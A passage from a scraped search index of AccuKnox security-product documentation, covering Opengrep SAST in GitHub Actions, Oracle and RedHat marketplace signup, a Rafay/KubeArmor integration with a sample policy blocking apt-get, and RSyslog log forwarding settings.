Default pipeline_id GitHub Run ID No <code>Github RunId</code> job_url GitHub Job URL No <code>Github Run URL</code> accuknox_endpoint CSPM panel URL Yes <code>cspm.demo.accuknox.com</code> accuknox_tenant AccuKnox Tenant ID Yes accuknox_token AccuKnox API Token Yes accuknox_label Label for scan results Yes input_soft_fail Continue even if scan fails No <code>false</code> upload_artifact Upload scan results as artifact No <code>true</code>"},{"location":"integrations/opengrep-sast/#workflow-execution-without-accuknox","title":"Workflow Execution Without AccuKnox","text":"<p>Initially, Opengrep scans the code for vulnerabilities but does not forward results to AccuKnox, requiring manual review.</p>"},{"location":"integrations/opengrep-sast/#workflow-execution-with-accuknox","title":"Workflow Execution With AccuKnox","text":"<p>With AccuKnox integrated, Opengrep scan results are automatically sent to AccuKnox for further risk assessment and remediation.</p> <p></p>"},{"location":"integrations/opengrep-sast/#viewing-results-in-accuknox","title":"Viewing Results in AccuKnox","text":"<ol> <li> <p>After execution, navigate to the AccuKnox dashboard.</p> </li> <li> <p>Open Issues &gt; Findings and check Opengrep Findings.     </p> </li> <li> <p>Select a vulnerability to inspect details.     </p> </li> <li> <p>Apply fixes based on recommendations under the Solutions tab.     </p> </li> <li> <p>Generate an issue ticket for tracking the fix.     </p> </li> <li> <p>Review Updated Results</p> <ul> <li> <p>After fixing the vulnerability, rerun the workflow.</p> </li> <li> <p>Navigate to the AccuKnox SaaS dashboard and verify that the vulnerability has been resolved.</p> </li> </ul> </li> </ol>"},{"location":"integrations/opengrep-sast/#conclusion","title":"Conclusion","text":"<p>Integrating SAST with AccuKnox in GitHub Actions enables automated vulnerability detection and secure development workflows. It provides centralized monitoring, early issue detection, and actionable remediation insights, ensuring code quality. By leveraging AccuKnox's risk assessment capabilities, developers can seamlessly enhance security while maintaining efficiency in their CI/CD pipeline.</p>"},{"location":"integrations/oracle-playbook/","title":"Oracle Marketplace Installation Guide","text":"<p>A step-by-step\u00a0process is needed to subscribe to AccuKnox via the Oracle Marketplace. It details the actions within the marketplace, the workflow for subscription and access, post-registration access acquisition, and the subsequent steps.</p> <p>Visit Marketplace</p>"},{"location":"integrations/oracle-playbook/#user-steps-required-on-oracle-marketplace","title":"User steps required on Oracle MarketPlace","text":""},{"location":"integrations/oracle-playbook/#overview","title":"Overview","text":"<p>The following steps are designed for users interested in obtaining a free trial from the marketplace, subscribing to existing public offers, acquiring a private offer customized to their specific needs, or setting up a recurring plan for public offers.</p>"},{"location":"integrations/oracle-playbook/#case-1-user-finds-accuknox-cnapp-on-oracle-marketplace","title":"Case 1: User finds AccuKnox\u00a0CNAPP\u00a0on Oracle marketplace","text":"<p>Step 1:\u00a0Access the Oracle Cloud Marketplace through the URL:\u00a0https://cloudmarketplace.oracle.com. Once there, enter \"AccuKnox\" into the search bar and press Enter to find the relevant product.</p> <p></p> <p>Step 2:\u00a0Select the \"AccuKnox - Zero Trust CNAPP\u00a0product from the search results to view more details.</p> <p></p> <p>Step 3:\u00a0Carefully review the product information provided. To start the process of subscribing and onboarding, click on the \"Subscribe\" button.</p> <p></p> <p>Step 4:\u00a0Following this, you will be redirected to the AccuKnox application, where you will be asked to provide the necessary details to complete your registration.</p> <p></p> <p>Step 5:\u00a0After submitting your information, the AccuKnox support team will reach out to guide you through the remaining onboarding process steps and ensure a smooth setup via email. </p> <p></p> <p>NOTE</p> <p>For users seeking a custom solution beyond the available offers, there is an option to reach out to AccuKnox support to explore alternative possibilities. Contact us at\u00a0support@accuknox.com.</p>"},{"location":"integrations/oracle-playbook/#case-2-user-finds-accuknox-cnapp-on-the-oracle-marketplace-30-days-free-trial","title":"Case 2: User finds AccuKnox\u00a0CNAPP\u00a0on the Oracle marketplace - 30 Days Free Trial","text":"<p>Step 1:\u00a0Access the Oracle Cloud Marketplace at\u00a0https://cloudmarketplace.oracle.com/marketplace/en_US\u00a0by navigating to the search bar and pressing Enter to find the relevant product.</p> <p> Step 2:\u00a0Select the \"AccuKnox\u00a0- Build to Runtime\"\u00a0product from the search results to view more details.</p> <p></p> <p>Step 3:\u00a0Review the product information and click on the \"Get App\" button to initiate the signup/onboarding process</p> <p></p> <p>Step 4:\u00a0Carefully read the terms and conditions provided by the Oracle marketplace and click on\u00a0next\u00a0to be redirected to the onboarding process. </p> <p>Step 5:\u00a0You will be redirected to the AccuKnox app, where you'll be prompted to provide the necessary details.</p> <p></p> <p>Step 6:\u00a0After you complete the details, you will be redirected to a page confirming your successful registration.</p> <p></p> <p>Step 7:\u00a0You will receive an email verification to the provided email,\u00a0click on the\"\u00a0verify email address\" \u00a0to go forward.</p> <p></p> <p>Step 8:\u00a0After verifying your email address, you will be redirected to the \"signup\" page of AccuKnox. Once you sign up, you will be taken to the\u00a0app.accuknox.com\u00a0page.</p> <p></p> <p>Step 9:\u00a0At this juncture, we strongly recommend scheduling a DEMO\u00a0with AccuKnox to assist the customer with the onboarding steps and gain a deeper understanding of our features.</p> <p>The AccuKnox support team will follow up to guide you through the onboarding process.</p> <p>NOTE</p> <p>The free trial subscription on the marketplace is only available to the user for a month. After one month, access shall be revoked. Before the end of the monthly subscription, we will notify the user. If the user still wants to continue using the platform they can opt for a paid subscription or reach out to us via\u00a0support@accuknox.com\u00a0(or)\u00a0Contact us\u00a0for custom pricing.</p>"},{"location":"integrations/rafay-accuknox/","title":"Rafay Integration with AccuKnox","text":"AccuKnox KubeArmor <p>Step 1: Creating Addon</p> <p>To integrate with the Rafay platform first we have created an addon using KubeArmor helm repository</p> <p></p> <p>Step 2: Creating Blue Print</p> <p>After creating the Add on to apply that in cluster we have created the Blueprint using the KubeArmor addon</p> <p></p> <p>Step 3: Connecting Cluster with Rafay</p> <p>3.1 Importing existing Cluster option</p> <p></p> <p>3.2 Selecting the Cluster Platform</p> <p></p> <p>3.3 Applying KubeArmor Blue Print to the Cluster</p> <p></p> <p>3.4 Connecting the Cluster to Rafay Platform</p> <p></p> <p>3.5 Applying the Bootstrap.yaml file to the Cluster</p> <pre><code>\u279c  ~ kubectl apply -f solutions-aks-bootstrap.yaml\nnamespace/rafay-system created\nserviceaccount/system-sa created\nclusterrole.rbac.authorization.k8s.io/rafay:manager unchanged\nclusterrolebinding.rbac.authorization.k8s.io/rafay:rafay-system:manager-rolebinding unchanged\nclusterrole.rbac.authorization.k8s.io/rafay:proxy-role unchanged\nclusterrolebinding.rbac.authorization.k8s.io/rafay:rafay-system:proxy-rolebinding unchanged\npriorityclass.scheduling.k8s.io/rafay-cluster-critical-v3 unchanged\npriorityclass.scheduling.k8s.io/rafay-cluster-critical unchanged\nrole.rbac.authorization.k8s.io/rafay:leader-election-role created\nrolebinding.rbac.authorization.k8s.io/rafay:leader-election-rolebinding created\ncustomresourcedefinition.apiextensions.k8s.io/namespaces.cluster.rafay.dev created\ncustomresourcedefinition.apiextensions.k8s.io/tasklets.cluster.rafay.dev configured\ncustomresourcedefinition.apiextensions.k8s.io/tasks.cluster.rafay.dev configured\nconfigmap/proxy-config-v3 created\nconfigmap/v2-relay-agent-config created\ndeployment.apps/v2-relay-agent created\nservice/controller-manager-metrics-service-v4 created\ndeployment.apps/controller-manager-v3 created\ncustomresourcedefinition.apiextensions.k8s.io/projects.system.k8smgmt.io configured\nconfigmap/connector-config-v3 created\ndeployment.apps/rafay-connector-v3 created\nservice/rafay-drift-v3 created\nvalidatingwebhookconfiguration.admissionregistration.k8s.io/rafay-drift-validate-v3 unchanged\n</code></pre> <p>3.6 Rafay and KubeArmor is deployed in the Cluster using the Blueprint</p> <pre><code>~ kubectl get po -A\nNAMESPACE         NAME                           READY    STATUS             RESTARTS           AGE\nkube-system       ama-logs-4nzhr                  2/2     Running            11 (71s ago)       6h23m\nkube-system       ama-logs-rs-776d765f6-wztpq     1/1     Running            0                  6h23m\nkube-system       azure-ip-masq-agent-hkkxl       1/1     Running            0                  37d\nkube-system       cloud-node-manager-8mxdn        1/1     Running            0                  49d\nkube-system       coredns-785fcf7bdd-8pbmz        1/1     Running            0                  58d\nkube-system       coredns-785fcf7bdd-qmt2x        1/1     Running            0                  58d\nkube-system       coredns-autoscaler-85bfd6cbd5-z 1/1     Running            0                  16d\nkube-system       csi-azuredisk-node-bswjb        3/3     Running            0                  37d\nkube-system       csi-azurefile-node-csvsg        3/3     Running            0                  21d\nkube-system       konnectivity-agent-6f76b87957-  1/1     Running            0                  58d\nkube-system       konnectivity-agent-6f76b87950   1/1     Running            0                  58d\nkube-system       kube-proxy-k5bxm                1/1     Running            0                  21d\nkube-system       metrics-server-6f8bd495cc-rmh7n 2/2     Running            0                  16d\nkube-system       metrics-server-6f8bd495cc-wlspn 2/2     Running            0                  16d\nkubearmor         kubearmor-controller-9989b6d8f  2/2     Running            0                  36s\nkubearmor         kubearmor-lb9db                 1/1     Running            0                  37s\nkubearmor         kubearmor-relay-6444b56c5-2lm6r 1/1     Running            0                  36s\nloki-stack-1      loki-0                          1/1     Running            0                  15h\nloki-stack-1      loki-promtail-rmjdp             1/1     Running            0                  15h\nrafay-system      controller-manager-v3-5545-45rm 1/1     Running            0                  45s\nrafay-system      edge-client-784bdd8496-bw6ms    1/1     Running            0                  52s\nrafay-system      rafay-connector-v3-5d7c7-7dwt8  1/1     Running            0                  46s\nrafay-system      v2-relay-agent-698b6fb5d6-r5k9t 1/1     Running            0                  115s\n</code></pre> <p>3.7 After applying the yaml file the cluster is connected to the Rafay System</p> <p></p> <p>Step 4: Applying KubeArmor Policy</p> <p>4.1 User needs to go the Cluster to apply the following KubeArmor policy.</p> <pre><code>apiVersion: security.kubearmor.com/v1\nkind: KubeArmorPolicy\nmetadata:\nname: wordpress-block-policy\nnamespace: wordpress-mysql\nspec:\nseverity: 3\nselector:\nmatchLabels:\napp: wordpress\nprocess:\nmatchPaths:\n- path: /usr/bin/apt-get\naction: Block\n</code></pre> <p>Save the policy as a .yaml file.</p> <p>4.2 Applying the policy from the cluster:</p> <pre><code>~ kubectl apply -f wordpress-block.yaml\nkubearmorpolicy.security.kubearmor.com/wordpress-block-policy created\n</code></pre> <p>Step 5: Violating the Policy</p> <p>For Violating the Above policy users need to navigate to the Rafay kubectl Utility</p> <pre><code>kubectl exec -it -n wordpress-mysql wordpress-23423-hajfg -- bash\napt-get update\n</code></pre> <p></p> <p>Step 6: Policy logs</p> <p>To see the Policy Logs the users must navigate to the Cluster CLI and give the following command and then violate the policy from Rafay Kubectl utility</p> <pre><code>karmor logs\n</code></pre> <p>Sample output:</p> <pre><code>\u279c  ~ karmor logs\nlocal port to be used for port forwarding kubearmor-relay-6444b56c5-2lm6r: 32866\nCreated a gRPC client (localhost:32866)\nChecked the liveness of the gRPC server\nStarted to watch alerts\n== Alert / 2023-08-17 09:24:25.288081 ==\nClusterName: default\nHostName: aks-agentpool-24991050-vmss000000\nNamespaceName: wordpress-mysql\nPodName: wordpress-84dbf54bb8-6xpf7\nLabels: app=wordpress\nContainerName: wordpress\nContainerID: 7c0f7042110a76fd5b64d0f55aa133a1ef459b72c12517e4f13baf067c36c826\nContainerImage: docker.io/library/wordpress:4.8-apache@sha256:6216f64ab88fc51d311e38c7f69ca3f9aaba621492b4f1fa93ddf63093768845\nType: MatchedPolicy\nPolicyName: wordpress-block-policy\nSeverity: 3\nSource: /bin/bash\nResource: /usr/bin/apt-get update\nOperation: Process\nAction: Block\nData: syscall=SYS_EXECVE\nEnforcer: AppArmor\nResult: Permission denied\nHostPID: 117393\nHostPPID: 112113\nOwner: map[Name:wordpress Namespace:wordpress-mysql Ref:Deployment]\nPID: 214\nPPID: 208\nParentProcessName: /bin/bash\nProcessName: /usr/bin/apt-get\n</code></pre> AccuKnox Enterprise <p>AccuKnox runtime security for Kubernetes helps you to discover the application behavior of your workload and provide the ability to enforce security policies. AccuKnox auto-detects and recommends Behavioral Policies based on app observability i.e. File system access for processes Processes that are getting network access for certain processes.</p> <p>AccuKnox utilizes KubeArmor to enforce runtime security policies, employing eBPF and LSMs(SELinux, BPF LSM, AppArmor). Based on the policies that are applied, LSMs will act as a checkpoint and check all the events and system calls against these policies before they reach the kernel Objects. KubeArmor ensures that any event that is not compliant with the policies doesn\u2019t get executed in the userspace, hence maintaining a secure space for your application to run.</p> <p>AccuKnox offers the subsequent enterprise functionalities to enhance runtime security:</p> <ul> <li>Auto-Discovered Behavioural Policies</li> <li>Recommendation of Hardening Policies based on compliance framework - MITRE, NIST, PCI-DSS, CIS</li> <li>Inventory View of Application</li> <li>Network Graph View of the Application</li> <li>Network Microsegmentation in the application</li> <li>Hardening of the Secrets Managers like Hashicorp Vault, CyberArk Conjur</li> <li>GitOps based Version Control for Policy Lifecycle Management</li> <li>Rollback of recently changed Policy governing App Behavior</li> <li>On-the-fly detection of change in App Behavior through Policies</li> <li>Multi-Tenant, Multi-Cluster, RBAC for user-management</li> <li>Comprehensive Dashboard across workloads running in Managed/Unmanaged Cluster, Containerized environment, VM or Baremetal</li> <li>Integration with Registries for Container Image Vuln Scan</li> <li>Telemetry aggregation (Process executed, File accessed, Network connections made) and Alerts events (Audit, Block)</li> <li>Integration to SIEM for security events and Notification tool</li> </ul> <p>The utilization of following AccuKnox agents assists in delivering the enterprise features:</p> <ol> <li>Agents operator: It will detect the environment of the k8s that is installed and based on that, it will pull all the AccuKnox Agents for Installation.</li> <li>Discovery Engine: AccuKnox Discovery Engine leverages the pod visibility provided by KubeArmor to automatically generate System and Network Policies.</li> <li>Feeder Service: The feeder service sends information from the Client Cluster to the AccuKnox SaaS Control Plane. Feeder Service is an agent that runs on every node, collects telemetry/alert events from source systems and messages, and emits them to Messaging Cluster for Storage and Analysis.</li> <li>Policy Enforcement Agent: AccuKnox\u2019s Policy Enforcement Agent enforces the policies by leveraging KubeArmor. The policy   not only keeps the track of the policies but is capable of doing tasks such as applying policies, denying policies, updating policies, and deleting the policies.</li> <li>Shared Informer Agent: Shared Informer Agent watches all the changes occurring in Kubernetes entities such as Pods, Nodes, Namespaces, Endpoints, and Services.</li> </ol> <p></p> <p>SCHEDULE DEMO</p>"},{"location":"integrations/rafay-accuknox/#1create-accuknox-agents-add-on","title":"1.Create AccuKnox Agents Add-On","text":"<p>Step 1: Navigate to Add-Ons section in the Rafay console, Click on New Add on button and select Create New \u201cAdd-On from Catalog\u201d.</p> <p></p> <p>Step 2: In the catalog search for AccuKnox and select accuknox-agents.</p> <p></p> <p>Step 3: Go to VALUES.YAML tab and download the file, this file will be used later in the steps.</p> <p></p> <p>Step 4: Click on Create Add-On.</p> <p></p> <p>Step 5: Give the Add-On a suitable Name and select \u201caccuknox-agents\u201d as namespace.</p> <p></p> <p>Step 6: Upload the VALUES.YAML that was downloaded in step 3 and click on the edit button to change some fields.</p> <p></p> <p>Step 7: Change the following fields respectively:</p> <ol> <li>spireHost=\"spire.stage.accuknox.com\"</li> <li>ppsHost=\"pps.stage.accuknox.com\"</li> <li>knoxGateway=\"knox-gw.stage.accuknox.com:3000\"</li> <li>joinToken= Get the token from AccuKnox Saas Platform</li> </ol> <p>(To see how to get joinToken refer to this guide : https://help.accuknox.com/getting-started/cluster-onboarding/)</p> <p></p> <p>Step 8: Save Changes to create a new version for the Add-On.</p> <p></p>"},{"location":"integrations/rafay-accuknox/#2creating-blueprint","title":"2.Creating Blueprint","text":"<p>After creating Add-on we need to create blue print with both KubeArmor and Accuknox-Agents.</p> <p>Step 1: To create a Blueprint user must navigate to the Infrastructure\u2192Blueprint and select New Blueprint</p> <p></p> <p>Step 2: Now give the name for the blue print and save it</p> <p></p> <p>Step 3: After that we need attach the kubearmor and AccuKnox- Agents add on that we created previously to the blueprint</p> <p></p>"},{"location":"integrations/rafay-accuknox/#3deploying-the-blueprint-in-cluster","title":"3.Deploying the Blueprint in Cluster","text":"<p>Step 1: Attaching the blueprint to the cluster by selecting the AccuKnox blueprint</p> <p></p> <p>Step 2: Download the bootstrap file from the Rafay interface and apply this to the cluster using CLI</p> <p></p> <p>Step 3: Applying the bootstrap.yaml in cluster</p> <pre><code>@LAPTOP-9Q1ERBHE:~$ kubectl apply -f ak-catalog-bootstrap.yaml\nnamespace/rafay-system created\nserviceaccount/system-sa created\nclusterrole.rbac.authorization.k8s.io/rafay:manager unchanged\nclusterrolebinding.rbac.authorization.k8s.io/rafay:rafay-system:manager-rolebinding created\nclusterrole.rbac.authorization.k8s.io/rafay:proxy-role unchanged\nclusterrolebinding.rbac.authorization.k8s.io/rafay:rafay-system:proxy-rolebinding unchanged\npriorityclass.scheduling.k8s.io/rafay-cluster-critical-v3 unchanged\npriorityclass.scheduling.k8s.io/rafay-cluster-critical created\nrole.rbac.authorization.k8s.io/rafay:leader-election-role created\nrolebinding.rbac.authorization.k8s.io/rafay:leader-election-rolebinding created\nWarning: Detected changes to resource namespaces.cluster.rafay.dev which is currently being deleted.\ncustomresourcedefinition.apiextensions.k8s.io/namespaces.cluster.rafay.dev configured\ncustomresourcedefinition.apiextensions.k8s.io/tasklets.cluster.rafay.dev created\ncustomresourcedefinition.apiextensions.k8s.io/tasks.cluster.rafay.dev created\nconfigmap/proxy-config-v3 created\nconfigmap/v2-relay-agent-config created\ndeployment.apps/v2-relay-agent created\nservice/controller-manager-metrics-service-v4 created\ndeployment.apps/controller-manager-v3 created\ncustomresourcedefinition.apiextensions.k8s.io/projects.system.k8smgmt.io created\nconfigmap/connector-config-v3 created\ndeployment.apps/rafay-connector-v3 created\nservice/rafay-drift-v3 created\nvalidatingwebhookconfiguration.admissionregistration.k8s.io/rafay-drift-validate-v3 created\n</code></pre> <p>Step 4: Wait for KubeArmor and AccuKnox to complete deployment</p> <p></p> <p>Step 5: Check if the cluster is onboarded on AccuKnox SaaS platform in the Cloud Workload section.</p> <p></p>"},{"location":"integrations/rafay-accuknox/#expected-outcome","title":"Expected Outcome","text":"<p>After Onboarding Process is complete user can utilize the following features of AccuKnox SaaS to protect their cloud workload at the runtime:</p>"},{"location":"integrations/rafay-accuknox/#application-behavior","title":"Application Behavior","text":"<p>Cluster workload behavior in AccuKnox SaaS is monitored using KubeArmor and AccuKnox Agents, installed as DaemonSets. Information is gathered at pod-level granularity, enabling users to access details for each pod in different namespaces. Workload behavior is presented through both list and graphical views.</p> <p></p> <p>List View: In the list view users can get the selected pod\u2019s application behavior in 3 types of list namely: - File Observability: It provides the information about the file access that are happening inside the pod. It gives information like which process is accessing which file in the pod. Along with the file information it gives status of the access either allow, audit or deny. - Process Observability: It shows what are all the process that are executing in the pod and which pods or container are executing that process. It also gives information about the process that are blocked from execution in the pod. - Network Observability: Network Observability shows the ingress and egress connection that are coming to and going out of the pod.It gives the information regarding Port number, source from where the ingress connection is coming and Destination to which egress connection is destined to go.</p> <p></p>"},{"location":"integrations/rafay-accuknox/#policy-dashboard","title":"Policy Dashboard","text":"<p>The AccuKnox CWPP Dashboard offers a comprehensive overview of runtime protection for clusters through various informative widgets. These widgets include:</p> <ul> <li>Alerts Summary: Provides a summarized count of alerts generated in the cluster or a specific namespace. Details include total alerts, blocked alerts (from system block policies), and audited alerts (from audit policies).</li> <li>Compliance Summary: Displays the compliance benchmarks applied to the cluster/namespace through KubeArmor's hardening policies. Presents information about MITRE, NIST, CIS, PCI-DSS benchmarks.</li> <li>Compliance Alerts: Graphically represents compliance alerts generated in the cluster/namespace, using distinct color coding for various compliance benchmarks like MITRE, NIST, PCI-DSS, etc.</li> <li>Namespace Severity: Offers a summary of attack severity attempted in the different namespaces within the cluster.</li> <li>Top 10 Policies by Alerts Count: Presents a graphical representation of the top 10 policies for which alerts are generated in the cluster/namespace. Useful for identifying high-alert generating policies.</li> <li>Namespace Alerts: Displays alerts specific to the selected namespace within the cluster, providing detailed information about the alerts.</li> <li>Pod Alerts: Offers insights into alerts originating from the pods running within the cluster/namespace.</li> <li>Alert based Operations: Graphically represents alert-triggering operations such as file access, process blocks, and audits, giving users an overview of the types of alerts generated.</li> <li>Alerts based on Severity: Provides information on attack severity levels that were mitigated by the runtime protection policies within the chosen cluster/namespace.</li> </ul> <p></p>"},{"location":"integrations/rafay-accuknox/#policy-enforcement","title":"Policy Enforcement","text":"<p>Policies section gives the user information about the runtime protection policies that are applied in the cluster. Policies are classified as Discovered, Active, inactive, Pending, Hardening and so on. We can see the policies based on the cluster, Namespace and policy type that we select in the filters shown in the page. AccuKnox has the option to see the policies related to a particular namespace and workload. Along with the discovered and Hardening policies users can also create custom policies by using the policy editor tool.</p> <p></p>"},{"location":"integrations/rafay-accuknox/#monitoring-logs","title":"Monitoring Logs","text":"<p>AccuKnox CNAPP Solution provides comprehensive visibility of the cloud assets with the help of Dashboards and logs/alerts. AccuKnox\u2019s open source KubeArmor can forward policy related logs/alerts to the SaaS. Also it can forward the container logs that is present in the workloads. Logs are generated in real-time based on certain conditions/rules you configure on the security policies. You will get logs from four different components.</p> <p></p> <p>The Log Detail contents vary depending on the selected component type of the log event.</p> <p></p>"},{"location":"integrations/rafay-accuknox/#siemnotification-integration","title":"SIEM/Notification Integration","text":"<p>Users can use Feeder service agent to pass the logs to other SIEM tools like Splunk, ELK, Rsyslog, etc.., Users can also forward the logs from AccuKnox SaaS using the channel integration option to these SIEM tools. User can integrate with various SIEM and ticketing tools like Splunk, Rsyslog, AWS CloudWatch, Elastic Search, Slack and Jira.</p> <p></p>"},{"location":"integrations/rh-playbook/","title":"RedHat Marketplace Installation Guide","text":"<p>This document illustrates the process of subscribing to AccuKnox via RedHat Marketplace, encompassing the necessary actions within the marketplace, the subscription and access workflow, the post-registration access acquisition, and the subsequent steps following access attainment.</p>"},{"location":"integrations/rh-playbook/#user-cases","title":"User Cases","text":"<ol> <li>Try a 1-month free trial</li> <li>Purchase for production use</li> <li>Onboard workloads to Accuknox</li> </ol>"},{"location":"integrations/rh-playbook/#case-1-try-a-1-month-free-trial","title":"Case 1:\u00a0Try a 1-month free trial","text":"<p>Step 1:\u00a0Start by searching for AccuKnox CNAPP on the\u00a0RedHat marketplace.</p> <p></p> <p>Step 2:\u00a0After reviewing our offerings, choose \"Free Trial\".</p> <p></p> <p>NOTE</p> <p>The free trial lasts 30 days and cannot be renewed. If the user hasn't logged in yet, they can log in with the credentials they want to use for the subscription.</p> <p>Step 3:\u00a0Click on \"Start Trial\".</p> <p></p> <p>Step 4:\u00a0Once the product is ready, view it by clicking on \"View Software\".</p> <p></p> <p>You will get an email confirmation with the product details. By clicking on \"My Software\", you may also view the product details to get started.</p> <p></p> <p>Step 5:\u00a0At this point, we strongly recommend\u00a0Scheduling a DEMO\u00a0with AccuKnox to assist you with the onboarding steps and gain a deeper understanding of our features.</p> <p></p> <p>Step 6:\u00a0Shortly after configuring a tenant for the customer, you will recieve an invitation to access the SaaS platform and leverage its security features.</p> <p>NOTE</p> <p>The free trial is available for 30 days. To continue using our product make sure to subscribe before the trial ends.</p>"},{"location":"integrations/rh-playbook/#case-2-purchase-for-production-use-case","title":"Case 2: Purchase for Production use case","text":"<p>Step 1: Begin by searching for AccuKnox CNAPP on the marketplace</p> <p></p> <p>Step 2:\u00a0After reviewing our offerings, click on the \"Purchase\" button.</p> <p></p> <p>Step 3:\u00a0Then click on \"Request Quote\".</p> <p></p> <p>Step 4:\u00a0A new window will pop up. By default your login email will be populated and cannot be changed. After filling in the other details, click \"Submit\".</p> <p></p> <p>This will redirect to the below screen that confirms that the request has been sent to the RedHat team.</p> <p></p> <p>As a next step, you can expect an email from the support team and can further schedule a demo call to understand and try the platform.</p>"},{"location":"integrations/rh-playbook/#case-3-onboard-openshift-clusters-to-the-accuknox-platform","title":"Case 3: Onboard Openshift clusters to the AccuKnox platform","text":"<p>Step 1:\u00a0Go to\u00a0https://catalog.redhat.com. From the drop-down select \"Software\" and search \"Accuknox\". From the search results, select the below one.</p> <p></p> <p>Step 2:\u00a0Click \"Deploy and use\" after learning about the offerings.</p> <p></p> <p>NOTE</p> <p>You are expected to have an Openshift cluster where operators can be deployed.</p> <p>Step 3:\u00a0Click on \"Quick start and configuration\". This will show the steps to get the necessary credentials to install the operators.</p> <p></p> <p>Step 4:\u00a0From the below two options, click on the preferred one to see operator installation instructions. Replace AccuKnox and Kubearmor operator names wherever needed.</p> <p></p>"},{"location":"integrations/rsyslog/","title":"RSyslog Integration","text":"<p>To forward the events to RSyslog you must first set up the RSyslog Integration.</p>"},{"location":"integrations/rsyslog/#integration-of-rsyslog","title":"Integration of RSyslog","text":""},{"location":"integrations/rsyslog/#a-prerequisites","title":"a. Prerequisites:","text":"<ul> <li>A running RSyslog server.</li> <li>Host name/IP, Port number, Transport type(TCP or UDP)</li> </ul> <p>Note: To deploy RSyslog server, follow RSyslog Documentation .</p>"},{"location":"integrations/rsyslog/#b-steps-to-integrate","title":"b. Steps to Integrate:","text":"<ul> <li>Go to Settings \u2192 Integrations \u2192 CWPP(Tab).</li> <li>Click integrate now on RSyslog.</li> </ul> <ul> <li> <p>Fill up the following fields:</p> <ul> <li> <p>Integration Name: Enter the name for the integration. You can set any name of your choice. e.g., <code>Container Security Alerts</code></p> </li> <li> <p>Server Address: Enter your RSyslog Server address here, IP address or fully qualified domain name (FQDN) of the RSyslog server e.g.,<code>rsyslog.mydomain.com or 35.xx.xx.xx</code></p> </li> <li> <p>Port: The port number to use when sending RSyslog messages (default is UDP on port 514); you must use the same port number. e.g., <code>514</code></p> </li> <li> <p>Transport: Select UDP, or TCP as the method of communication with the RSyslog server</p> </li> </ul> </li> <li> <p>Click Test to check the new functionality, You will receive the test message on configured RSyslog Server. <code>-Test message Please ignore !!</code></p> </li> <li> <p>Click Save to save the Integration. You can now configure Alert Triggers for RSyslog Events</p> </li> </ul> <p>SCHEDULE DEMO</p>"},{"location":"integrations/rsyslog_feeder_integration/","title":"RSyslog Integration with AccuKnox","text":""},{"location":"integrations/rsyslog_feeder_integration/#overview","title":"Overview","text":"<p>RSYSLOG is the rocket-fast system for log processing. It offers high-performance, great security features and a modular design. While it started as a regular syslogd, rsyslog has evolved into a kind of swiss army knife of logging, being able to accept inputs from a wide variety of sources, transform them, and output to the results to diverse destinations. In the case of a deployment with a high rate of log generation, or to store on a server to forward it to other sources like Datadog, McAfee SIEM, Azure Sentinel, AlienVault, etc., you can forward syslogs over an Ethernet interface to prevent loss of logs and reduce the load on the management interface, which optimizes management operations.</p>"},{"location":"integrations/rsyslog_feeder_integration/#prerequisites","title":"Prerequisites","text":"<ul> <li>A running RSyslog server.</li> <li>Host name/IP, Port number, Transport type(TCP or UDP)</li> <li>Feeder Service Running on Client's cluster.</li> </ul> <p>Note : To deploy RSyslog server , RSyslog Documentation .</p>"},{"location":"integrations/rsyslog_feeder_integration/#configuration","title":"Configuration","text":"<p>To forward the Alerts based on Policy Violation to RSyslog Server set the following environment variables <code>RSYSLOG_FEEDER_ENABLED</code> and <code>RSYSLOG_ALERTS_ENABLED</code> to <code>true</code> and to forward Logs <code>RSYSLOG_LOGS_ENABLED</code> to <code>true</code> in your Feeder Agent manifest.</p> <p>Also set the environment variables <code>RSYSLOG_URL</code>, <code>RSYSLOG_TRANSPORT</code>, <code>RSYSLOG_PORT</code> of the RSyslog Server Deployed. To start editing the chart:</p> <pre><code>kubectl edit deployment feeder-service -n accuknox-agents\n</code></pre> <p>Edit the following Enviornment Variables mentioned below:</p> <pre><code>- name: RSYSLOG_FEEDER_ENABLED\n  value: \"true\"\n- name: RSYSLOG_ALERTS_ENABLED\n  value: \"true\"\n- name: RSYSLOG_LOGS_ENABLED\n  value: \"true\"\n- name: RSYSLOG_URL\n  value: 34.XX.XX.XXX\n- name: RSYSLOG_PORT\n  value: 514\n- name: RSYSLOG_TRANSPORT\n  value: tcp\n</code></pre> <p>OR  To set the the envionment variables on Run Time to Integrate the Rsyslog with Feeder Service Agent, One can use a single command.</p> <pre><code>kubectl set env deploy/feeder-service -n accuknox-agents RSYSLOG_ALERTS_ENABLED=true RSYSLOG_FEEDER_ENABLED=true RSYSLOG_LOGS_ENABLED=false RSYSLOG_URL=&lt;RSYSLOG_IP&gt; RSYSLOG_PORT=&lt;RSYSLOG_PORT&gt; RSYSLOG_TRANSPORT=&lt;RSYSLOG_TRANSPORT&gt;\n</code></pre> <p>Replace <code>&lt;RSYSLOG_IP&gt;</code> , <code>&lt;RSYSLOG_PORT&gt;</code> and <code>&lt;RSYSLOG_TRANSPORT&gt;</code> from your Rsyslog Server.</p>"},{"location":"integrations/rsyslog_feeder_integration/#environment-variables-for-rsyslog-integration","title":"Environment variables for RSyslog Integration","text":"<p>The following is the list of environment variables available for the Feeder-Service-Agent</p> <p>| Env Variable                    | Description                                                                                                                                                                                                                | | ------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | --- | | <code>RSYSLOG_FEEDER_ENABLED</code>        | Setting this to <code>true</code> forward the Logs and Alerts to RSyslog Server                                                                                                                                                       | | <code>RSYSLOG_ALERTS_ENABLED</code>        | Setting this to <code>true</code> forward the Policy Violated Alerts to RSyslog Server                                                                                                                                                | | <code>RSYSLOG_LOGS_ENABLED</code>          | Setting this to <code>true</code> forward the Logs to RSyslog Server                                                                                                                                                                  | | <code>RSYSLOG_URL</code>                   | Enter your RSyslog Server address here, IP address or fully qualified domain name (FQDN) of the RSyslog server. For example: <code>rsyslog.mydomain.com</code> or <code>35.xx.xx.xx</code>                                                       |     | | <code>RSYSLOG_PORT</code>                  | The port number to use when sending syslog messages (default is UDP on port 514); you must use the same port number. e.g., <code>514</code>                                                                                           | | <code>RSYSLOG_TRANSPORT</code>             | Add <code>udp</code>,<code>tcp</code> or <code>tcp+tls</code>as the method of communication with the RSyslog server. *Note**: The methods here are case sensitive, add as mentioned and to enable tls users need to pass the path to .pem file | | <code>RSYSLOG_TLS_CERTIFICATES_PATH</code> | Add the <code>path/to/certificate.pem</code> , *Note**: Create the secret manually and mount it on feeder service by specifying the mounts in feederService.volumeMounts[] and feederService.volumes[]                     |</p> <p>Once the enviornment variables are passed and deployment is updated, the feeder service pod 